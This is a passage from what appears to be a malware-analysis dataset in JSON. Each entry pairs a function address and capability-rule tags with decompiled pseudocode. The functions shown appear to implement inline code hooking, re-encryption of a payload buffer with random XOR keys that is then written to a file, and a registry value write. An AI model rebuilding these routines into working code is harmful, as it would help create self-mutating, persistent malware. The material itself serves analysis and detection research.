                          piStack56 = 0x402a4c;\n                                    iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e0b9, 1);\n                                    if (iVar2 != 0xffff) {\n                                        iStackY65616 = 1;\n                                    }\n                                }\n                                piStack56 = 0x402a71;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e0a3, 1);\n                                if (iVar2 != 0xffff) {\n                                    piStack56 = 0x402a8e;\n                                    iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e0b9, 1);\n                                    if (iVar2 != 0xffff) {\n                                        iStackY65616 = 1;\n                                    }\n                                }\n                                piStack56 = 0x402ab3;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e094, 1);\n                                if (iVar2 != 0xffff) {\n                                    iStackY65616 = 1;\n                                }\n                                uStackY65628 = 0x3ef5e320;\n                                piStack56 = 0x402ae7;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e083, 1);\n                                if (iVar2 != 0xffff) {\n                                    iStackY65616 = 1;\n                                }\n                                piStack56 = 0x402b0c;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e078, 1);\n                                if (iVar2 != 0xffff) {\n                                    piStack56 = 0x402b29;\n                                    iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e0b9, 1);\n                                    if (iVar2 == 0xffff) {\n                                        piStack56 = 0x402b46;\n                                        iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e070, 1);\n                                        if (iVar2 == 0xffff) goto code_r0x00402b5a;\n                                    }\n                                    iStackY65616 = 1;\n                                }\n                            }\ncode_r0x00402b5a:\n                            if (iStackY65616 == 0) {\n                                *0x42b470 = 0;\n                                fcn.0040263c(&stack0xfffefff9);\n                            }\n                            else {\n                                *0x42b470 = 1;\n                                *0x42b464 = *0x42a054;\n                            }\n                        }\n                        uStackY65543._0_1_ = '\\0';\n                    }\n                }\n            }\n            (**(*piStackY65576 + 8))();\n        }\n        (**(*piStackY65572 + 8))();\n    } while( true );\n}\n",
        "token_count": 4233
    },
    "004030de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004030de(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x42b484;\n    uStack16 = 0x40109a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    var_4h = 0;\n    do {\n        func_0x00409988(600);\n        uVar1 = fcn.004027b7();\n    } while (*0x42b480 != 0);\n    *in_FS_OFFSET = var_10h;\n    return uVar1;\n}\n",
        "token_count": 186
    },
    "004031b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004034c1)\n// WARNING: Removing unreachable block (ram,0x004034fc)\n// WARNING: Removing unreachable block (ram,0x00403502)\n// WARNING: Removing unreachable block (ram,0x00403508)\n// WARNING: Removing unreachable block (ram,0x0040351c)\n// WARNING: Removing unreachable block (ram,0x00403527)\n// WARNING: Removing unreachable block (ram,0x00403545)\n// WARNING: Removing unreachable block (ram,0x0040354b)\n// WARNING: Removing unreachable block (ram,0x0040356f)\n// WARNING: Removing unreachable block (ram,0x00403575)\n// WARNING: Removing unreachable block (ram,0x0040357b)\n// WARNING: Removing unreachable block (ram,0x00403530)\n// WARNING: Removing unreachable block (ram,0x00403536)\n// WARNING: Removing unreachable block (ram,0x0040353c)\n\nulong __cdecl fcn.004031b7(uint8_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    ulong uVar5;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    iVar2 = *0x42b474;\n    *0x42b474 = *0x42b474 + 1;\n    *0x409004 = 0;\n    *0x419f18 = 0;\n    *0x419f38 = 0;\n    *0x409008 = 0;\n    *0x419dec = 4;\n    *0x419944 = 4;\n    *0x419940 = *arg_8h;\n    if (*0x419940 < 0x100) {\n    // WARNING: Jumptable at 0x0040323b did not pass sanity check.\n    // WARNING: Treating indirect jump as call\n        uVar5 = (**(*0x419940 * 4 + 0x42b490))();\n        return uVar5;\n    }\n    *0x42b474 = iVar2 + 2;\n    *0x419f18 = 0;\n    *0x409008 = 0;\n    uVar3 = 0x112a;\n    puVar4 = arg_8h + 1;\n    for (*0x40900c = 0; uVar1 = *0x40900c,  *0x40900c < *0x409008; *0x40900c = *0x40900c + 1) {\n        *(*0x40900c + 0x419938) = *puVar4;\n        uVar3 = uVar1;\n        puVar4 = puVar4 + 1;\n    }\n    for (*0x40900c = 0; uVar1 = *0x40900c,  *0x40900c < *0x419f38; *0x40900c = *0x40900c + 1) {\n        *(*0x40900c + 0x42a3a8) = *puVar4;\n        uVar3 = uVar1;\n        puVar4 = puVar4 + 1;\n    }\n    *0x42b474 = *0x42b474 + 1;\n    *0x409004 = puVar4 - arg_8h;\n    return CONCAT44(uVar3, 1);\n}\n",
        "token_count": 783
    },
    "00403859": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403859(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    uVar4 = 0;\n    do {\n        if ((((*(arg_8h + uVar4) == -1) && (*(uVar4 + 1 + arg_8h) == -1)) && (*(uVar4 + 2 + arg_8h) == -1)) &&\n           ((*(uVar4 + 3 + arg_8h) == -1 && (*(uVar4 + 4 + arg_8h) == -1)))) {\n            return;\n        }\n        *(arg_ch + 5 + arg_10h + uVar4) = *(arg_8h + uVar4);\n        var_1h._0_1_ = 0;\n        while (((cVar1 = *(var_1h + 0x42bc62),  *(arg_8h + uVar4) != cVar1 || (*(arg_8h + (uVar4 - 1)) != cVar1)) ||\n               ((*(arg_8h + (uVar4 - 2)) != cVar1 ||\n                ((*(arg_8h + (uVar4 - 3)) != cVar1 || (*(arg_8h + (uVar4 - 4)) != -0x18))))))) {\n            if (*(var_1h * 0x14 + 0x42bcd2) == '\\0') goto code_r0x0040398f;\n            var_1h._0_1_ = var_1h + 1;\n        }\n        uVar2 = func_0x004095e0(var_1h * 0xf + 0x42bc69);\n        iVar3 = func_0x004095f8(uVar2, var_1h * 0x14 + 0x42bcd2);\n        *(arg_ch + arg_10h + uVar4 + 2) = (iVar3 - (arg_ch + arg_10h + uVar4 + 1)) + -5;\ncode_r0x0040398f:\n        if (((((*(arg_8h + uVar4) == '\\x04') && (*(arg_8h + (uVar4 - 1)) == '\\x04')) &&\n             (*(arg_8h + (uVar4 - 2)) == '\\x04')) && (*(arg_8h + (uVar4 - 3)) == '\\x04')) &&\n           (((cVar1 = *(arg_8h + (uVar4 - 4)),  cVar1 == 'h' || (cVar1 == -0x42)) || (*(arg_8h + (uVar4 - 5)) == '$'))))\n        {\n            *(arg_ch + arg_10h + uVar4 + 2) = arg_ch + arg_10h + 7;\n        }\n        if ((((*(arg_8h + uVar4) == '\\x02') && (*(arg_8h + (uVar4 - 1)) == '\\x02')) &&\n            ((*(arg_8h + (uVar4 - 2)) == '\\x02' && (*(arg_8h + (uVar4 - 3)) == '\\x02')))) &&\n           ((cVar1 = *(arg_8h + (uVar4 - 4)),  cVar1 == -0x18 || (cVar1 == -0x17)))) {\n            *(arg_ch + arg_10h + uVar4 + 2) = (-arg_10h - uVar4) + -6;\n        }\n        if ((((*(arg_8h + uVar4) == '\\x01') && (*(arg_8h + (uVar4 - 1)) == '\\x01')) &&\n            (*(arg_8h + (uVar4 - 2)) == '\\x01')) &&\n           ((*(arg_8h + (uVar4 - 3)) == '\\x01' &&\n            (((cVar1 = *(arg_8h + (uVar4 - 4)),  cVar1 == '=' || (cVar1 == -2)) || (cVar1 == -1)))))) {\n            uVar2 = func_0x004095a4();\n            *(arg_ch + arg_10h + uVar4 + 2) = uVar2;\n        }\n        uVar4 = uVar4 + 1;\n        if (0x3ff < uVar4) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1093
    },
    "00403abe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403abe(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t arg_ch_00;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = *0x42b474;\n    *0x42b474 = *0x42b474 + 1;\n    while( true ) {\n        if (arg_ch - 1000U < arg_8h) {\n            return;\n        }\n        for (uVar3 = 0; (uVar3 < 0x3e9 && (*(arg_8h + uVar3) == '\\0')); uVar3 = uVar3 + 1) {\n        }\n        if (999 < uVar3) break;\n        arg_8h = arg_8h + 1;\n    }\n    arg_ch_00 = arg_8h + 10;\n    *0x42b474 = iVar2 + 2;\n    puVar1 = *((arg_10h & 0xff) * 4 + 0x409120);\n    uVar3 = 0;\n    do {\n        fcn.004031b7(puVar1 + uVar3);\n        *0x42b474 = *0x42b474 + 1;\n        if ((puVar1[uVar3] == -0x18) || (puVar1[uVar3] == -0x17)) {\n            *(arg_ch_00 + uVar3) = puVar1[uVar3];\n            *(arg_8h + 0xb + uVar3) = puVar1 + (*(puVar1 + uVar3 + 1) - arg_ch_00);\n        }\n        else {\n            for (var_4h = 0; var_4h < *0x409004; var_4h = var_4h + 1) {\n                *(arg_ch_00 + uVar3 + var_4h) = puVar1[uVar3 + var_4h];\n            }\n        }\n        uVar3 = uVar3 + *0x409004;\n    } while (uVar3 < 5);\n    *(uVar3 + arg_ch_00) = 0xe9;\n    *(arg_8h + 0xb + uVar3) = puVar1 + (-5 - arg_ch_00);\n    *0x42b474 = *0x42b474 + 1;\n    *puVar1 = 0xe9;\n    *(puVar1 + 1) = ((arg_8h + uVar3) - puVar1) + 10;\n    fcn.00403859(*((arg_10h & 0xff) * 4 + 0x42bc58), arg_ch_00, uVar3);\n    return;\n}\n",
        "token_count": 653
    },
    "00403bed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403bed(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char *unaff_EBX;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uchar *puVar7;\n    char *apcStackY9568 [247];\n    char *pcStackY8580;\n    int32_t iStackY8568;\n    code *pcStackY8564;\n    int32_t *piStackY8560;\n    int32_t iStackY8556;\n    int32_t iStackY8552;\n    uint uStackY8548;\n    int32_t iStackY8544;\n    uint32_t uStackY8540;\n    code *pcStackY8280;\n    int32_t iStackY8276;\n    int32_t iStackY8272;\n    uint32_t uStackY8268;\n    uint32_t uStackY8264;\n    int32_t iStackY8256;\n    uint32_t uStackY8240;\n    uint uStackY8236;\n    uint32_t uStackY8232;\n    char cStackY8225;\n    char *pcStackY8224;\n    uint auStackY8220 [1025];\n    uint32_t var_1014h;\n    char *var_100dh;\n    uint var_1008h;\n    uint uStackY40;\n    uint uStackY36;\n    uint32_t uStackY32;\n    char *var_4h;\n    \n    func_0x00409528();\n    fcn.00403608();\n    cStackY8225 = '\\0';\n    uVar2 = func_0x00409628();\n    if (uVar2 < 0x80000000) {\n        cStackY8225 = '\\x01';\n    }\n    var_100dh._0_1_ = 0;\n    *0x42b474 = *0x42b474 + 7;\n    do {\n        if (((cStackY8225 != '\\0') || (*(var_100dh + 0x42bc60) != '\\x01')) &&\n           ((cStackY8225 == '\\0' || (*(var_100dh + 0x42bc60) != '\\x02')))) {\n            uStackY8540 = var_100dh;\n            uVar3 = func_0x00409688();\n            *(uStackY8540 * 4 + 0x419950) = uVar3;\n            iStackY8544 = var_100dh * 4;\n            uStackY32 = 0x403cb1;\n            uVar3 = func_0x004095f8();\n            *(iStackY8544 + 0x409120) = uVar3;\n        }\n        var_100dh._0_1_ = var_100dh + 1;\n    } while (*(var_100dh * 0x1e + 0x42bbde) != '\\0');\n    var_100dh._0_1_ = 0;\n    var_4h = unaff_EBX;\n    do {\n        if (*(var_100dh * 4 + 0x409120) != 0) {\n            uStackY8240 = *(var_100dh * 4 + 0x419950);\n            *0x42b474 = *0x42b474 + 1;\n            if (cStackY8225 == '\\0') goto code_r0x00403ebd;\n            uStackY8236 = fcn.0040368e();\n            *0x42b474 = *0x42b474 + 1;\n            unaff_EBX = uStackY8240 & 0xffc00000;\n            *NULL = unaff_EBX + 0x400000;\n            iVar5 = 0;\n            for (; unaff_EBX <= stack0xffffeff0; unaff_EBX = unaff_EBX + 0x1000) {\n                uVar2 = func_0x00409670();\n                (&fcn.00403bed::var_1008h)[iVar5] = (uVar2 ^ 1) << 2;\n                iVar5 = iVar5 + 1;\n            }\n            func_0x0040964c();\n            *0x42b474 = *0x42b474 + 1;\n            for (var_1014h = 0; var_1014h <= iStackY8568 - 0xffffU; var_1014h = var_1014h + 0x10000) {\n                uStackY32 = 0x403db3;\n                var_4h = fcn.004037d4(uStackY8236, var_1014h, 0xffff);\n                if (var_4h != NULL) {\n                    pcStackY8580 = NULL;\n                    unaff_EBX = pcStackY8580;\n                    while (unaff_EBX < 0xf001) {\n                        uVar2 = 0;\n                        do {\n                            if ((*(var_4h + uVar2 * 4 + (unaff_EBX & 0xfffffffc)) & 4) !=\n                                (&fcn.00403bed::var_1008h)[uVar2]) break;\n                            uVar2 = uVar2 + 1;\n                        } while (uVar2 < 0x400);\n                        if (uVar2 < 0x3ff) {\n                            unaff_EBX = unaff_EBX + 0x1000;\n                        }\n                        else {\n                            pcStackY8580 = unaff_EBX + 0x1000;\n                            stack0xffffeff0 = NULL;\n                            do {\n                                *(&stack0xffffdfe4 + stack0xffffeff0 * 4) =\n                                     *(var_4h + stack0xffffeff0 * 4 + (unaff_EBX & 0xfffffffc));\n                                var_4h[stack0xffffeff0 * 4 + (unaff_EBX & 0xfffffffc)] =\n                                     var_4h[stack0xffffeff0 * 4 + (unaff_EBX & 0xfffffffc)] | 2;\n                                unique0x00007a80 = stack0xffffeff0 + 1;\n                            } while (unique0x00007a80 < 0x400);\ncode_r0x00403ebd:\n                            *0x42b474 = *0x42b474 + 1;\n                            if (cStackY8225 == '\\0') {\n                                uStackY8548 = func_0x004095e0();\n                                iStackY8552 = uStackY8548 + *(uStackY8548 + 0x3c);\n                                iStackY8556 = uStackY8548 + *(iStackY8552 + 0x78);\n                                piStackY8560 = uStackY8548 + *(iStackY8556 + 0x1c);\n                                pcStackY8564 = uStackY8548 + *piStackY8560;\n                                pcStackY8280 = pcStackY8564;\n                            }\n                            uStackY8232 = uStackY8240;\n                            while( true ) {\n                                uStackY32 = 0x403f47;\n                                func_0x0040970c();\n                                if (uStackY8264 != uStackY8240) break;\n                                iStackY8272 = iStackY8256;\n                                uStackY8232 = uStackY8232 + iStackY8256;\n                                if (cStackY8225 == '\\0') {\n                                    uStackY32 = uStackY8268 >> 0xc;\n                                    uStackY36 = 0x1000d;\n                                    uStackY40 = 0x403f96;\n                                    (*pcStackY8280)();\n                                }\n                            }\n                            *0x42b474 = *0x42b474 + 1;\n                            *(var_100dh * 4 + 0x409530) = uStackY8232 - uStackY8240;\n                            unique0x00007a00 = *(var_100dh * 4 + 0x409120);\n                            iStackY8276 = func_0x0040967c();\n                            if (iStackY8276 == 0) {\n                                if (arg_8h != '\\0') {\n                                    if (*stack0xffffeff0 == -0x17) {\n                                        pcStackY8224 = stack0xffffeff0 + *(stack0xffffeff0 + 1) + 5;\n                                        uStackY8548 = uStackY8548 & 0xffffff;\n                                        while( true ) {\n                                            pcVar4 = pcStackY8224 + -5;\n                                            pcStackY8224 = pcVar4;\n                                            for (; (((pcVar4[-1] != '\\0' || (pcVar4[-2] != '\\0')) ||\n                                                    (pcVar4[-3] != '\\0')) ||\n                                                   ((pcVar4[-4] != '\\0' || (pcVar4[-5] != '\\0')))); pcVar4 = pcVar4 + -1\n                                                ) {\n                                            }\n                                            *(&stack0xffffdaa0 + (uStackY8548 >> 0x18) * 4) = pcVar4;\n                                            uStackY8548 = uStackY8548 & 0xffffff | uStackY8548._3_1_ + 1 << 0x18;\n                                            pcVar6 = pcVar4;\n                                            if (*pcVar4 != -0x17) break;\n                                            pcStackY8224 = pcVar4 + *(pcVar4 + 1) + 5;\n                                        }\n                                        for (; pcVar6 < pcStackY8224; pcVar6 = pcVar6 + 1) {\n                                            (stack0xffffeff0 + pcVar6)[-pcVar4] = *pcVar6;\n                                        }\n                                        do {\n                                            uVar1 = uStackY8548._3_1_ - 1;\n                                            uStackY8548 = uStackY8548 & 0xffffff | uVar1 << 0x18;\n                                            for (puVar7 = *(&stack0xffffdaa0 + uVar1 * 4);\n                                                ((*puVar7 = 0,  puVar7[1] != '\\0' || (puVar7[2] != '\\0')) ||\n                                                ((puVar7[3] != '\\0' || ((puVar7[4] != '\\0' || (puVar7[5] != '\\0'))))));\n                                                puVar7 = puVar7 + 1) {\n                                            }\n                                        } while (uVar1 != 0);\n                                    }\n                                    if (arg_8h == '\\x01') goto code_r0x0040414b;\n                                }\n                                uStackY32 = 0x404148;\n                                fcn.00403abe(uStackY8240, uStackY8232, var_100dh);\n                            }\ncode_r0x0040414b:\n                            if (cStackY8225 == '\\0') goto code_r0x00404196;\n                            stack0xffffeff0 = NULL;\n                            do {\n                                *(var_4h + stack0xffffeff0 * 4 + (unaff_EBX & 0xfffffffc)) =\n                                     *(&stack0xffffdfe4 + stack0xffffeff0 * 4);\n                                unique0x00007a80 = stack0xffffeff0 + 1;\n                            } while (unique0x00007a80 < 0x400);\n                            *0x42b474 = *0x42b474 + 1;\n                            unaff_EBX = pcStackY8580;\n                        }\n                    }\n                    fcn.00403836(var_4h);\n                }\n            }\n            *0x42b474 = *0x42b474 + 1;\n            func_0x004095ec();\n        }\ncode_r0x00404196:\n        var_100dh._0_1_ = var_100dh + 1;\n        if (*(var_100dh * 0x1e + 0x42bbde) == '\\0') {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 2696
    },
    "00404349": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404349(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    func_0x004095d4(0, arg_8h, 0xff);\n    iVar1 = -1;\n    do {\n        iVar1 = iVar1 + 1;\n    } while (*(arg_8h + iVar1) != '\\0');\n    while( true ) {\n        if (iVar1 < 2) {\n            return;\n        }\n        if (*(arg_8h + iVar1) == '\\\\') break;\n        iVar1 = iVar1 + -1;\n    }\n    *(iVar1 + 1 + arg_8h) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "004045d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045d9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = 0;\n    for (iVar2 = 0; iVar2 < arg_ch; iVar2 = iVar2 + 1) {\n        iVar1 = iVar1 + *(arg_8h + iVar2);\n    }\n    func_0x004099d0(0x42e041, arg_ch, iVar1);\n    func_0x004099d0(0x42e03b);\n    for (iVar1 = 0; iVar1 < arg_ch; iVar1 = iVar1 + 1) {\n        func_0x004099d0(0x42e035, *(arg_8h + iVar1));\n    }\n    for (iVar1 = 0; iVar1 < arg_ch; iVar1 = iVar1 + 1) {\n        if (*(arg_8h + iVar1) == '\\0') {\n            *(arg_8h + iVar1) = 0x2e;\n        }\n    }\n    func_0x004099d0(0x42e028, arg_8h);\n    return;\n}\n",
        "token_count": 276
    },
    "004046d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004046d0(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_24h;\n    uint var_1eh;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint8_t var_fh;\n    uint var_eh;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    var_1eh._0_2_ = 1;\n    var_14h = 0;\n    var_18h = 0;\n    puVar2 = 0x42bd9b;\n    puVar3 = &var_eh;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (arg_10h == '\\x01') {\n        var_1eh._0_2_ = 0x18;\n    }\n    for (var_1h._0_1_ = arg_8h[1]; var_1h != 0; var_1h._0_1_ = var_1h - 1) {\n        var_14h = var_14h + (&var_fh)[var_1h] + 0x1e;\n        if (var_1h == 2) {\n            var_14h = var_14h + -2;\n        }\n    }\n    for (var_2h = arg_ch[1]; var_2h != 0; var_2h = var_2h - 1) {\n        var_18h = var_18h + (&var_fh)[var_2h] + 0x1e;\n        if (var_2h == 2) {\n            var_18h = var_18h + -2;\n        }\n    }\n    return (*arg_ch - *arg_8h) * 0x16d * var_1eh + (var_18h - var_14h) * var_1eh + (arg_ch[3] - arg_8h[3]) * var_1eh +\n           (arg_ch[4] - arg_8h[4]);\n}\n",
        "token_count": 566
    },
    "004049f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004049f1(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    int32_t var_4h;\n    \n    var_4h = 0x61474ec1;\n    var_10h._0_2_ = 0;\n    for (uVar3 = 0; uVar3 < (arg_ch & 0xffff) - 1; uVar3 = uVar3 + 6) {\n        var_4h = var_4h * 0x57bf;\n        var_5h = fcn.004041ba(arg_8h + uVar3);\n        if (var_5h == 0) {\n            var_6h = 0;\n        }\n        else {\n            iVar1 = func_0x004099e8();\n            var_6h = iVar1 / (0x7fff / (7 - var_5h));\n        }\n        if ((0x6f < *(uVar3 + arg_8h)) && (*(uVar3 + arg_8h) < 0x80)) {\n            pcVar2 = arg_8h + uVar3 + 1;\n            *pcVar2 = *pcVar2 - var_6h;\n        }\n        if (*(uVar3 + arg_8h) == -0x1e) {\n            pcVar2 = arg_8h + uVar3 + 1;\n            *pcVar2 = *pcVar2 - var_6h;\n        }\n        var_4h = 0;\n        func_0x004099c4(&var_10h + 2, 0x90, 8);\n        func_0x004099b8(&var_10h + var_6h + 2, arg_8h + uVar3, var_5h);\n        func_0x004099b8(arg_8h + uVar3, &var_10h + 2, 6);\n        var_4h = var_4h * 0x265f;\n        var_10h._0_2_ = var_10h + 1;\n    }\n    return;\n}\n",
        "token_count": 594
    },
    "00404b30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404b30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_11h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = func_0x004099e8();\n    var_11h._0_1_ = iVar1 / 0x2aaa;\n    if (*0x42bdc4 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0040441a(arg_8h, &var_20h);\n        if (iVar1 != 0) {\n            var_18h = (*(var_11h * 4 + 0x42bdac) - *(var_11h * 4 + 0x42bda8)) - 1;\n            func_0x004099b8(iVar1 + *0x42bdc4, *(var_11h * 4 + 0x42bda8), var_18h);\n            func_0x004099c4(iVar1 + *0x42bdc4 + var_18h, 0, 0xc);\n            for (var_4h = *0x42bdc8; var_4h < *0x42bdc8 + *0x42bdcc; var_4h = var_4h + 4) {\n                *(iVar1 + var_4h) = *(iVar1 + var_4h) ^ *0x42bdd0;\n            }\n            for (var_8h = *0x42bdd4; var_8h < *0x42bdd4 + *0x42bdd8; var_8h = var_8h + 4) {\n                *(iVar1 + var_8h) = *(iVar1 + var_8h) ^ *0x42bddc;\n            }\n            uVar2 = func_0x004099e8();\n            iVar3 = func_0x004099e8();\n            *0x42bdd0 = uVar2 & 0xffff | iVar3 << 0x10;\n            uVar2 = func_0x004099e8();\n            iVar3 = func_0x004099e8();\n            *0x42bddc = uVar2 & 0xffff | iVar3 << 0x10;\n            func_0x004099b8(iVar1 + *0x42bdc0, 0x42bdb8, 0x40);\n            for (var_ch = *0x42bdc8; var_ch < *0x42bdc8 + *0x42bdcc; var_ch = var_ch + 4) {\n                *(iVar1 + var_ch) = *(iVar1 + var_ch) ^ *0x42bdd0;\n            }\n            for (stack0xffffffec = *0x42bdd4; stack0xffffffec < *0x42bdd4 + *0x42bdd8;\n                unique0x00007a80 = stack0xffffffec + 4) {\n                *(iVar1 + stack0xffffffec) = *(iVar1 + stack0xffffffec) ^ *0x42bddc;\n            }\n            *(*(var_11h * 8 + 0x42bde0) + iVar1 + *0x42bdc4) = *0x42bdd0;\n            *(*(var_11h * 8 + 0x42bde4) + iVar1 + *0x42bdc4) = *0x42bddc;\n            if (var_11h == 1) {\n                var_18h = var_18h - 0x18;\n            }\n            fcn.004049f1(iVar1 + *0x42bdc4, var_18h & 0xffff);\n            var_1ch = func_0x004096b8(arg_8h, 0x40000000, 0, 0, 2, 0, 0);\n            func_0x00409748(var_1ch, iVar1, var_20h, &var_18h, 0);\n            func_0x004095ec(var_1ch);\n            func_0x004096a0(iVar1);\n            iVar1 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 1043
    },
    "00404f6f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f6f(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    var_4h = 0;\n    func_0x0040991c(arg_8h, arg_ch, 0, 0, 0, 0xf003f, 0, &var_4h, &var_8h);\n    var_8h = -1;\n    do {\n        var_8h = var_8h + 1;\n    } while (*(arg_14h + var_8h) != '\\0');\n    func_0x0040994c(var_4h, arg_10h, 0, 1, arg_14h, var_8h);\n    func_0x00409928(var_4h);\n    return;\n}\n",
        "token_count": 224
    },
    "00405143": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
